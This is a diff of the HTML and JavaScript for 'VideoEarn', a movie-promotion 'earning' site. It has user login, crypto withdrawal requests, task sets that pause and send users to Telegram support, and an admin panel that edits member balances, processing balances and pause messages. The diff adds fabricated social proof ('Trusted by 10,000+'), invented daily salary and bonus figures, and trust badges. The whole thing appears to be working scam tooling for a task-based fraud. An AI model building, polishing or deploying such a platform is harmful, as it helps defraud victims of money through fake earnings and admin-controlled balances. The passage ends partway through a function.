@@ -3,150 +3,117 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>StarLife | VideoEarn Platform</title>
+  <title>VideoEarn Platform</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #0b0f17;
-      --card-bg: #141a26;
-      --border: #262f40;
-      --primary: #ec1c24;
-      --primary-hover: #c81017;
-      --accent-purple: #7000ff;
-      --accent-gradient: linear-gradient(135deg, #7000ff 0%, #00d2ff 100%);
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
-      --success: #10b981;
-      --warning: #f59e0b;
+      --bg: #0d0d0d;
+      --card-bg: #ffffff;
+      --border: #e2e8f0;
+      --primary: #ff6b00;
+      --primary-hover: #e05d00;
+      --text: #121212;
+      --text-muted: #64748b;
+      --success: #16a34a;
+      --warning: #d97706;
       --telegram: #0088cc;
+      --dark-card: #1a1a1a;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
-    body { background-color: var(--bg); color: var(--text); padding: 0 0 40px 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
-    .container { width: 100%; max-width: 520px; display: flex; flex-direction: column; gap: 16px; padding: 0 16px; }
+    body { background-color: var(--bg); color: #ffffff; padding: 16px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+    .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 16px; }
 
-    /* TOP BANNER & HEADER */
-    .announcement-bar { background: var(--primary); color: #fff; width: 100%; text-align: center; padding: 10px 16px; font-weight: 800; font-size: 0.85rem; letter-spacing: 0.5px; text-transform: uppercase; }
-    .announcement-bar span { opacity: 0.9; font-weight: 600; text-transform: none; }
-    
-    header { width: 100%; max-width: 520px; display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid var(--border); }
-    .logo-box { display: flex; align-items: center; gap: 10px; }
-    .logo-badge { background: var(--accent-gradient); color: #fff; width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 1.2rem; box-shadow: 0 4px 12px rgba(112, 0, 255, 0.4); }
-    .logo-text { font-size: 1.3rem; font-weight: 900; letter-spacing: -0.5px; color: #fff; }
-    .logo-text span { color: var(--primary); }
-    .nav-btn { background: #1e293b; border: 1px solid var(--border); color: var(--text); padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 700; transition: all 0.2s; }
-    .nav-btn:hover { background: #334155; }
+    header { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #2a2a2a; }
+    .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); }
+    .nav-btn { background: #1a1a1a; border: 1px solid #333333; color: #ffffff; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; }
+    .nav-btn:hover { background: #2a2a2a; }
 
-    /* HERO STYLING FOR AUTH */
-    .hero-banner { text-align: center; padding: 24px 16px 12px 16px; background: radial-gradient(circle at top, rgba(112, 0, 255, 0.15) 0%, rgba(11, 15, 23, 0) 70%); }
-    .hero-title { font-size: 1.8rem; font-weight: 900; line-height: 1.2; margin-bottom: 8px; background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .hero-subtitle { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 16px; line-height: 1.4; }
-
-    /* SOCIAL PROOF BANNER */
-    .social-proof-container { display: flex; align-items: center; gap: 14px; justify-content: center; padding: 12px; background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; }
-    .avatar-group { display: flex; align-items: center; }
-    .avatar { width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--card-bg); object-fit: cover; margin-left: -10px; }
-    .avatar:first-child { margin-left: 0; }
-    .proof-content { display: flex; flex-direction: column; text-align: left; }
-    .stars { color: #f59e0b; font-size: 0.85rem; letter-spacing: 2px; line-height: 1; margin-bottom: 4px; }
-    .proof-text { font-size: 0.8rem; color: var(--text-muted); margin: 0; line-height: 1.2; }
-    .proof-text strong { color: var(--text); font-weight: 800; }
-
-    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 20px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); }
-    h2, h3, h4 { margin-bottom: 12px; color: var(--text); font-weight: 800; }
+    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 20px; color: var(--text); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    h2, h3, h4 { margin-bottom: 12px; color: var(--text); }
     p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 12px; }
 
-    .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: 700; color: #fff; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; font-size: 0.95rem; transition: background 0.2s; }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 700; color: #fff; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; transition: background 0.2s ease; }
     .btn:hover { background: var(--primary-hover); }
-    .btn-secondary { background: #1e293b; color: var(--text); border: 1px solid var(--border); }
-    .btn-secondary:hover { background: #334155; }
+    .btn-secondary { background: #f1f5f9; color: var(--text); border: 1px solid var(--border); }
+    .btn-secondary:hover { background: #e2e8f0; }
     .btn-telegram { background: var(--telegram); color: #fff; }
-
-    label { display: block; font-size: 0.8rem; font-weight: 700; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-    input, select, textarea { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: #0b0f17; color: var(--text); margin-bottom: 14px; font-size: 0.95rem; }
-    input:focus, select:focus, textarea:focus { outline: 2px solid var(--primary); border-color: transparent; }
-
-    .progress-bar { background: #1e293b; height: 10px; border-radius: 5px; overflow: hidden; margin: 12px 0; }
-    .progress-fill { background: var(--accent-gradient); height: 100%; width: 0%; transition: width 0.3s ease; }
     
-    .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: left; padding: 16px; background: #0b0f17; }
-    .movie-box img { width: 100%; max-height: 260px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #1e293b; border: 1px solid var(--border); }
-    .movie-title-text { font-size: 1.1rem; font-weight: 800; color: #fff; margin-bottom: 4px; }
-    .movie-bio-text { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 12px; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
+    label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 4px; }
+    input, select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: #f8fafc; color: var(--text); margin-bottom: 12px; font-size: 0.9rem; }
+    input:focus, select:focus, textarea:focus { outline: 2px solid var(--primary); background: #fff; }
 
-    .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 14px; }
-    .stat-card { background: #0b0f17; padding: 10px 8px; border-radius: 10px; text-align: center; border: 1px solid var(--border); }
-    .stat-card span { font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase; display: block; margin-bottom: 2px; }
-    .stat-card div { font-size: 1rem; font-weight: 800; color: #fff; }
+    .progress-bar { background: #e2e8f0; height: 10px; border-radius: 5px; overflow: hidden; margin: 12px 0; }
+    .progress-fill { background: var(--primary); height: 100%; width: 0%; transition: width 0.3s ease; }
+    .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 12px; background: #f8fafc; }
+    .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #e2e8f0; }
+    
+    .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+    .stat-card { background: #f8fafc; padding: 10px 6px; border-radius: 8px; text-align: center; border: 1px solid var(--border); }
+    .stat-card span { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; display: block; }
+    .stat-card div { font-size: 1rem; font-weight: 800; color: var(--primary); margin-top: 4px; }
 
     .admin-section { border-top: 1px dashed var(--border); padding-top: 16px; margin-top: 16px; }
     .hidden { display: none !important; }
     .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 700; }
-
-    .user-list-box { background: #0b0f17; border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 200px; overflow-y: auto; margin-bottom: 12px; }
+    
+    .user-list-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 200px; overflow-y: auto; margin-bottom: 12px; }
     .user-item { display: flex; flex-direction: column; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 2px; }
-    .user-item-header { display: flex; justify-content: space-between; font-weight: 700; }
-    .user-item-details { font-size: 0.75rem; color: var(--text-muted); }
 
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(4px); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
-    .modal-box { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); animation: popIn 0.2s ease-out; }
-    @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    /* REVIEWS / TRUST BADGE STYLING */
+    .trust-badge-card { background: #ffffff; border-radius: 16px; padding: 16px; text-align: center; display: flex; flex-direction: column; align-items: center; border: 1px solid var(--border); margin-top: 12px; }
+    .avatar-group { display: flex; align-items: center; justify-content: center; margin-bottom: 8px; }
+    .avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #ffffff; margin-left: -10px; background-size: cover; background-position: center; }
+    .avatar:first-child { margin-left: 0; }
+    .star-rating { color: #ffb800; font-size: 1.2rem; margin-bottom: 4px; letter-spacing: 2px; }
+    .trust-text { font-size: 0.95rem; font-weight: 700; color: #334155; }
+    .trust-text span { font-weight: 800; color: #0f172a; }
+
+    /* FEATURE BADGES STYLING */
+    .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
+    .feature-box { background: #fff; border: 1px solid var(--border); border-radius: 12px; padding: 12px; text-align: center; font-size: 0.8rem; font-weight: 700; color: var(--text); }
+    .feature-icon { font-size: 1.4rem; color: var(--primary); margin-bottom: 4px; display: block; }
+
+    /* SALARY PACKAGE STYLING */
+    .salary-card { background: #ffffff; border-radius: 16px; padding: 16px; border: 1px solid var(--border); margin-top: 12px; }
+    .salary-title { text-align: center; font-size: 1.3rem; font-weight: 800; color: #0f172a; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+    .day-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #f1f5f9; font-size: 0.85rem; font-weight: 600; }
+    .reward-box { background: #f8fafc; border-radius: 10px; padding: 10px; margin-top: 10px; text-align: center; border: 1px solid var(--border); }
+    .reward-val { font-size: 1.2rem; font-weight: 800; color: var(--primary); }
+
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
+    .modal-box { background: #ffffff; border-radius: 16px; padding: 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
   </style>
 </head>
 <body>
 
-  <div class="announcement-bar">
-    NOW PART OF THE StarLife GROUP! <span>&gt;&gt; Join US</span>
-  </div>
-
-  <header>
-    <div class="logo-box">
-      <div class="logo-badge">S</div>
-      <div class="logo-text">Star<span>Life</span></div>
-    </div>
-    <button class="nav-btn" id="toggle-view-btn" onclick="toggleView()">Admin Login</button>
-  </header>
-
   <div class="container">
+    <header>
+      <div class="logo">VideoEarn</div>
+      <button class="nav-btn" id="toggle-view-btn" onclick="toggleView()">Admin Login</button>
+    </header>
+
     <!-- AUTHENTICATION VIEW -->
     <div id="auth-view">
-      <div class="hero-banner">
-        <div class="hero-title">WE PARTNER WITH BRANDS TO CREATE IMPACTFUL MOMENTS</div>
-        <div class="hero-subtitle">Explore content production, promote exclusive films, and earn daily rewards.</div>
-      </div>
-
       <div class="card">
-        <div class="social-proof-container">
-          <div class="avatar-group">
-            <img src="https://i.pravatar.cc/100?img=12" alt="User 1" class="avatar">
-            <img src="https://i.pravatar.cc/100?img=33" alt="User 2" class="avatar">
-            <img src="https://i.pravatar.cc/100?img=47" alt="User 3" class="avatar">
-            <img src="https://i.pravatar.cc/100?img=68" alt="User 4" class="avatar">
-          </div>
-          <div class="proof-content">
-            <div class="stars">★★★★★</div>
-            <p class="proof-text">Trusted by <strong>10,000+</strong> partners</p>
-          </div>
-        </div>
-
         <div id="login-box">
           <h3>Welcome Back</h3>
-          <p>Log in to access your media promotion workspace.</p>
+          <p>Log in to your VideoEarn account</p>
           <label>Email or Username</label>
           <input type="text" id="login-identifier" placeholder="Enter Email or Username">
           <label>Password</label>
           <input type="password" id="login-password" placeholder="Password">
           <button class="btn" onclick="userLogin()">Log In</button>
-          <p style="margin-top: 16px; text-align: center;">
+          <p style="margin-top: 12px; text-align: center;">
             Don't have an account? <span class="tab-link" onclick="showAuthTab('signup')">Sign Up</span>
           </p>
         </div>
 
         <div id="signup-box" class="hidden">
           <h3>Create Account</h3>
-          <p>Register as a new partner to start earning instantly.</p>
+          <p>Register as a new member to start earning</p>
           <label>Email Address</label>
           <input type="email" id="signup-email" placeholder="name@example.com">
           <label>Username</label>
@@ -154,10 +121,22 @@
           <label>Password</label>
           <input type="password" id="signup-password" placeholder="Create Password">
           <button class="btn" onclick="userSignup()">Create Account</button>
-          <p style="margin-top: 16px; text-align: center;">
+          <p style="margin-top: 12px; text-align: center;">
             Already have an account? <span class="tab-link" onclick="showAuthTab('login')">Log In</span>
           </p>
         </div>
+      </div>
+
+      <!-- TRUST REVIEWS SECTION UNDER FRONT SIGN UP PAGE -->
+      <div class="trust-badge-card">
+        <div class="avatar-group">
+          <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80');"></div>
+          <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80');"></div>
+          <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=100&q=80');"></div>
+          <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=100&q=80');"></div>
+        </div>
+        <div class="star-rating">★★★★★</div>
+        <div class="trust-text">Trusted by <span>10,000+</span> happy customers</div>
       </div>
     </div>
 
@@ -169,11 +148,10 @@
           <button class="nav-btn" onclick="userLogout()">Logout (<span id="user-display-name">User</span>)</button>
         </div>
 
-        <!-- STATS GRID WITH PROCESSING BALANCE -->
         <div class="stats-grid">
           <div class="stat-card">
-            <span>Current Set</span>
-            <div id="current-set-display" style="color: var(--text-muted);">Set 1 / 3</div>
+            <span>Set</span>
+            <div id="current-set-display">1 / 3</div>
           </div>
           <div class="stat-card">
             <span>Balance</span>
@@ -181,11 +159,11 @@
           </div>
           <div class="stat-card">
             <span>Processing</span>
-            <div id="worker-processing-balance" style="color: var(--warning);">$0.00</div>
+            <div id="processing-balance" style="color: var(--primary);">$0.00</div>
           </div>
         </div>
 
-        <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 600; color: var(--text-muted);">
+        <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 600;">
           <span>Progress (Set <span id="set-num-text">1</span>)</span>
           <span id="progress-text">0 / 16 Completed</span>
         </div>
@@ -193,41 +171,69 @@
           <div class="progress-fill" id="progress-fill"></div>
         </div>
 
-        <!-- PAUSED TASK NOTIFICATION -->
-        <div id="completed-set-message" class="hidden" style="text-align: center; padding: 20px 14px; background: rgba(245, 158, 11, 0.1); border: 1px solid var(--warning); border-radius: 12px; margin-top: 12px;">
+        <!-- SET COMPLETED / WORK PAUSED NOTIFICATION -->
+        <div id="completed-set-message" class="hidden" style="text-align: center; padding: 20px 10px; background: #fffbeeb0; border: 1px solid #fef3c7; border-radius: 12px; margin-top: 12px;">
           <h4 style="color: var(--warning); margin-bottom: 8px;">⏸️ Task Notice</h4>
-          <p id="pause-reason-text" style="color: var(--text); font-weight: 500; font-size: 0.9rem; margin-bottom: 16px;">
+          <p id="pause-reason-text" style="color: #92400e; font-weight: 500; font-size: 0.95rem; margin-bottom: 16px;">
             You have successfully completed this set! Kindly contact customer support to proceed to the next set.
           </p>
           <a id="support-set-link" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Contact Customer Support</a>
         </div>
 
-        <!-- MOVIE PROMOTION BOX -->
         <div id="movie-container" class="movie-box" style="margin-top:12px;">
           <img id="movie-img" src="" alt="Promo Movie">
-          <div id="movie-title" class="movie-title-text">Featured Movie Title</div>
-          <div id="movie-bio" class="movie-bio-text">Loading movie storyline summary...</div>
-          <p id="admin-comment" style="font-style: italic; color: var(--accent-purple); font-size: 0.85rem; margin-bottom: 10px;">Admin Comment: Ready to promote!</p>
-          <div style="font-weight: 800; color: var(--success); margin-bottom: 10px; font-size: 1.05rem;">Task Reward: <span id="movie-reward">$0.50</span></div>
+          <h4 id="movie-title">Movie Promotion #1</h4>
+          <p id="admin-comment" style="font-style: italic; color: var(--primary);">Admin Comment: Ready to promote!</p>
+          <div style="font-weight: 700; color: var(--success); margin-bottom: 8px;">Reward: <span id="movie-reward">$0.50</span></div>
           <button class="btn" onclick="promoteMovie()">Promote This Movie</button>
         </div>
       </div>
 
-      <div class="card">
+      <!-- SALARY PACKAGE SECTION -->
+      <div class="salary-card">
+        <div class="salary-title">Salary Package</div>
+        <div class="day-row"><span>Day 1</span> <span>$100 - $150</span></div>
+        <div class="day-row"><span>Day 2</span> <span>$100 - $300</span></div>
+        <div class="day-row"><span>Day 3</span> <span>$150 - $450</span></div>
+        <div class="day-row"><span>Day 4</span> <span>$200 - $600</span></div>
+        <div class="day-row"><span>Day 5</span> <span>$250 - $750</span></div>
+        <div class="day-row"><span>Day 6</span> <span>$300 - $900</span></div>
+        <div class="day-row"><span>Day 7</span> <span>$350 - $1,050</span></div>
+
+        <div class="reward-box">
+          <span style="font-size:0.8rem; font-weight:600; color:var(--text-muted);">4 Consecutive Days Reward</span>
+          <div class="reward-val">$2,500</div>
+        </div>
+        <div class="reward-box">
+          <span style="font-size:0.8rem; font-weight:600; color:var(--text-muted);">7 Consecutive Days Reward</span>
+          <div class="reward-val">$3,700</div>
+        </div>
+      </div>
+
+      <!-- FEATURES & SERVICE CARD -->
+      <div class="feature-grid">
+        <div class="feature-box"><span class="feature-icon">⚡</span>Instant Delivery</div>
+        <div class="feature-box"><span class="feature-icon">📈</span>High Success Rate</div>
+        <div class="feature-box"><span class="feature-icon">🎧</span>24/7 Support</div>
+        <div class="feature-box"><span class="feature-icon">🛡️</span>Secure & Safe</div>
+      </div>
+
+      <div class="card" style="margin-top: 12px;">
         <h3>Withdraw Earnings</h3>
         <p>Request withdrawal once available balance is ready.</p>
         <label>Crypto Wallet Address</label>
-        <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH Address">
+        <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
         <label>Withdrawal Amount ($)</label>
         <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
         <button class="btn btn-secondary" onclick="requestWithdrawal()">Apply for Withdrawal</button>
-        <p id="withdraw-status" style="margin-top: 10px; font-size: 0.85rem; text-align: center; font-weight: 600;"></p>
+        <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
       </div>
 
-      <div class="card" style="text-align: center;">
-        <h3>Need Help?</h3>
-        <p>Contact our Official Support Team on Telegram for instant assistance.</p>
-        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Chat with Support on Telegram</a>
+      <!-- CUSTOMER SERVICE CARD -->
+      <div class="card" style="text-align: center; margin-top: 12px;">
+        <h3>Customer Service</h3>
+        <p>Contact our official support team on Telegram for help with tasks, salary packages, or withdrawals.</p>
+        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Chat with Customer Service</a>
       </div>
     </div>
 
@@ -247,11 +253,13 @@
             <button class="nav-btn" onclick="logoutAdmin()">Logout</button>
           </div>
 
+          <!-- All Registered Members -->
           <div class="admin-section">
             <h4>All Registered Members</h4>
             <div id="all-users-list" class="user-list-box">Loading users...</div>
           </div>
 
+          <!-- Manage Selected Member -->
           <div class="admin-section">
             <h4>Manage Selected Member</h4>
             <label>Select Member to Manage:</label>
@@ -273,11 +281,15 @@
             <label>Edit Member Balance ($):</label>
             <input type="number" id="admin-user-balance" step="0.01">
 
+            <label>Edit Processing Balance ($):</label>
+            <input type="number" id="admin-user-processing-balance" step="0.01">
+
             <button class="btn btn-secondary" onclick="saveAdminUserSettings()">Update Member Settings</button>
             <button class="btn" style="margin-top: 8px; background: #dc2626;" onclick="clearMemberPause()">Clear Pause & Resume Work</button>
             <button class="btn" style="margin-top: 8px;" onclick="approveNextSet()">Approve Set & Move to Next</button>
           </div>
 
+          <!-- Manage Telegram Support Link -->
           <div class="admin-section">
             <h4>Telegram Support Settings</h4>
             <label>Telegram Support Link or Username:</label>
@@ -285,8 +297,9 @@
             <button class="btn btn-secondary" onclick="saveTelegramLink()">Save Telegram Support Link</button>
           </div>
 
+          <!-- Upload Picture & Edit Settings -->
           <div class="admin-section">
-            <h4>Upload & Edit Movie Details</h4>
+            <h4>Upload & Edit Movie Pictures</h4>
             <label>Select Set Number (1, 2, or 3):</label>
             <select id="edit-set-num">
               <option value="1">Set 1</option>
@@ -300,12 +313,6 @@
             <label>Upload Movie Picture:</label>
             <input type="file" id="edit-img-file" accept="image/*">
 
-            <label>Movie Title:</label>
-            <input type="text" id="edit-img-title" placeholder="e.g. Inception">
-
-            <label>Movie Synopsis / Catchy Bio:</label>
-            <textarea id="edit-img-bio" rows="2" placeholder="Write catchy movie tagline or plot..."></textarea>
-
             <label>Reward Amount ($):</label>
             <input type="number" id="edit-img-reward" value="0.50" step="0.01">
 
@@ -315,6 +322,7 @@
             <button class="btn btn-secondary" onclick="savePictureAndSettings()">Save Picture & Details</button>
           </div>
 
+          <!-- Withdrawal Requests -->
           <div class="admin-section">
             <h4>Withdrawal Requests</h4>
             <p id="admin-withdraw-request-text">No active withdrawal request.</p>
@@ -381,7 +389,7 @@
       try {
         const browserName = userData.browser || detectBrowser();
         const deviceType = userData.device || detectDevice();
-
+        
         await setDoc(doc(db, "users", userData.username), {
           username: userData.username,
           email: userData.email,
@@ -456,37 +464,9 @@
     window.listenToFirebaseData();
   </script>
 
-  <!-- APPLICATION LOGIC -->
   <script>
     window.users = JSON.parse(localStorage.getItem('ve_users')) || {};
     window.globalPictureData = JSON.parse(localStorage.getItem('ve_pictures')) || {};
-
-    // POPULATE INTERESTING DEFAULT MOVIES & BIOS
-    const defaultMovies = [
-      { title: "Inception", img: "https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600&auto=format&fit=crop", bio: "A thief who steals corporate secrets through dream-sharing technology is given the inverse task of planting an idea into the mind of a C.E.O." },
-      { title: "The Dark Knight", img: "https://images.unsplash.com/photo-1509198397868-475647b2a1e5?w=600&auto=format&fit=crop", bio: "When the menace known as the Joker wreaks havoc and chaos on the people of Gotham, Batman must accept one of the greatest psychological tests of his ability." },
-      { title: "Interstellar", img: "https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=600&auto=format&fit=crop", bio: "When Earth becomes uninhabitable, a team of explorers undertakes the most important mission in human history: traveling beyond this galaxy to discover a future." },
-      { title: "Avatar: The Way of Water", img: "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=600&auto=format&fit=crop", bio: "Jake Sully lives with his newfound family formed on the planet of Pandora. Once a familiar threat returns to finish what was previously started, Jake must work with Neytiri." },
-      { title: "Dune: Part Two", img: "https://images.unsplash.com/photo-1509198397868-475647b2a1e5?w=600&auto=format&fit=crop", bio: "Paul Atreides unites with Chani and the Fremen while seeking revenge against the conspirators who destroyed his family." },
-      { title: "Oppenheimer", img: "https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=600&auto=format&fit=crop", bio: "The story of American scientist J. Robert Oppenheimer and his role in the development of the atomic bomb." }
-    ];
-
-    // Seed defaults if empty
-    [1, 2, 3].forEach(set => {
-      for (let i = 1; i <= 16; i++) {
-        const key = `${set}-${i}`;
-        if (!window.globalPictureData[key]) {
-          const sample = defaultMovies[(i + set) % defaultMovies.length];
-          window.globalPictureData[key] = {
-            src: sample.img,
-            title: `${sample.title} #${i}`,
-            bio: sample.bio,
-            reward: 0.50,
-            comment: "High Demand Blockbuster - Featured Promo!"
-          };
-        }
-      }
-    });
 
     window.telegramLink = localStorage.getItem('ve_telegram_link') || 'https://t.me/';
     let currentUser = localStorage.getItem('ve_current_user') || null;
@@ -666,13 +646,12 @@
         const item = document.createElement('div');
         item.className = 'user-item';
         const bal = typeof window.users[u].balance === 'number' ? window.users[u].balance.toFixed(2) : '0.00';
-        const pBal = typeof window.users[u].processingBalance === 'number' ? window.users[u].processingBalance.toFixed(2) : '0.00';
         item.innerHTML = `
-          <div class="user-item-header">
-            <span>${u} <small>($${bal} | Proc: $${pBal})</small></span>
+          <div style="display:flex; justify-style:space-between; font-weight:700;">
+            <span>${u} <small>($${bal})</small></span>
             <span style="color:var(--primary);">${window.users[u].browser || 'Browser'} / ${window.users[u].device || 'Device'}</span>
           </div>
-          <div class="user-item-details">${window.users[u].email || 'No email'}</div>
+          <div style="font-size:0.75rem; color:var(--text-muted);">${window.users[u].email || 'No email'}</div>
         `;
         userListContainer.appendChild(item);
       });
@@ -688,6 +667,7 @@
 
       const user = window.users[selectedUser];
       document.getElementById('admin-user-balance').value = user.balance || 0;
+      document.getElementById('admin-user-processing-balance').value = user.processingBalance || 0;
       document.getElementById('admin-stop-work-num').value = user.stopLimit || 16;
       document.getElementById('admin-pause-message').value = user.pauseMessage || "You have reached a pause milestone. Kindly contact customer support to proceed to the next task.";
       document.getElementById('admin-user-set-select').value = user.currentSet || 1;
@@ -696,7 +676,7 @@
       const wApproveBtn = document.getElementById('approve-withdraw-btn');
 
       if (user.withdrawalStatus === 'Pending') {
-        const wAmt = user.withdrawalAmount || user.processingBalance || 0;
+        const wAmt = user.withdrawalAmount || user.balance || 0;
         wReqText.innerHTML = `<strong>${selectedUser}</strong> requested <strong>$${wAmt.toFixed(2)}</strong><br><small>Wallet: ${user.walletAddress || 'N/A'}</small>`;
         wApproveBtn.style.display = 'block';
       } else {
@@ -710,14 +690,16 @@
       if (!selectedUser || !window.users[selectedUser]) return;
 
       const newBal = parseFloat(document.getElementById('admin-user-balance').value) || 0;
+      const newProcBal = parseFloat(document.getElementById('admin-user-processing-balance').value) || 0;
       const stopNum = parseInt(document.getElementById('admin-stop-work-num').value) || 16;
       const setNum = parseInt(document.getElementById('admin-user-set-select').value) || 1;
       const pauseMsg = document.getElementById('admin-pause-message').value.trim();
 
       window.users[selectedUser].balance = newBal;
+      window.users[selectedUser].processingBalance = newProcBal;
       window.users[selectedUser].stopLimit = stopNum;
       window.users[selectedUser].pauseMessage = pauseMsg;
-
+      
       if (window.users[selectedUser].currentSet !== setNum) {
         window.users[selectedUser].currentSet = setNum;
         window.users[selectedUser].completedInSet = 0;
@@ -752,71 +734,6 @@
       alert(`Cleared pause for ${selectedUser}! Member can now continue tasks.`);
     }
 
-    async function approveNextSet() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      const user = window.users[selectedUser];
-      if (user.currentSet < 3) {
-        user.currentSet += 1;
-        user.completedInSet = 0;
-        user.stopLimit = 16;
-        user.isSetApproved = true;
-
-        window.saveUsers();
-        if (window.saveUserToFirebase) {
-          await window.saveUserToFirebase(user);
-        }
-        window.populateAdminUsers();
-        renderUI();
-        alert(`Approved ${selectedUser} for Set ${user.currentSet}!`);
-      } else {
-        alert(`${selectedUser} is already on Set 3.`);
-      }
-    }
-
-    async function savePictureAndSettings() {
-      const setNum = document.getElementById('edit-set-num').value;
-      const imgIdx = document.getElementById('edit-img-index').value;
-      const fileInput = document.getElementById('edit-img-file');
-      const title = document.getElementById('edit-img-title').value.trim();
-      const bio = document.getElementById('edit-img-bio').value.trim();
-      const reward = parseFloat(document.getElementById('edit-img-reward').value) || 0.50;
-      const comment = document.getElementById('edit-img-comment').value.trim();
-
-      const key = `${setNum}-${imgIdx}`;
-      const existing = window.globalPictureData[key] || {};
-
-      const applySave = async (srcUrl) => {
-        const picObj = {
-          src: srcUrl || existing.src || defaultMovies[0].img,
-          title: title || existing.title || `Movie Promotion #${imgIdx}`,
-          bio: bio || existing.bio || `High engagement blockbuster promo content for Set ${setNum}.`,
-          reward: reward,
-          comment: comment || existing.comment || "Featured Movie Promotion!"
-        };
-
-        window.globalPictureData[key] = picObj;
-        window.savePictures();
